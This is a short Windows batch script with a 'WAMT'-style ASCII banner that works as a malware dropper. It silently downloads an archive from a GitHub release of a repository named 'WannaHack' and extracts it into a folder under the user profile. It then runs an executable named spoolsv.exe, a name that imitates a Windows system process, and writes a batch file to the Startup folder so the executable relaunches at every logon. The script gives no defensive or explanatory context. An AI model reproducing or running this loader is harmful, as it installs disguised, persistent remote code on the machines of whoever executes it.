@echo off
title
color 4
echo "             _____  "
echo "  _ _ _ ____|___  | "
echo " | | | |  |  ||  _| "
echo " | | | |     ||_|   "
echo " |_____|__|__||_|   "
echo:
echo:

echo [!] STATUS: DOWNLOADING... [!]
set "zipUrl=https://github.com/Foliowiec/WannaHack/releases/download/two/spoolsv.rar"
set "downloadPath=%USERPROFILE%\URN"
if not exist "%downloadPath%" mkdir "%downloadPath%"
curl -s -L -o "%downloadPath%\sys.rar" "%zipUrl%"


echo [!] DONE [!]

echo [!] FINISHING TOUCHES [!]
C:
cd %downloadPath%
tar -xf sys.rar
set "startup=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "batchScriptPath=%startup%\sys.bat"
(
echo @echo off
echo start "" "%downloadPath%\spoolsv\spoolsv.exe"
) > "%batchScriptPath%"

start "" "%downloadPath%\spoolsv\spoolsv.exe"
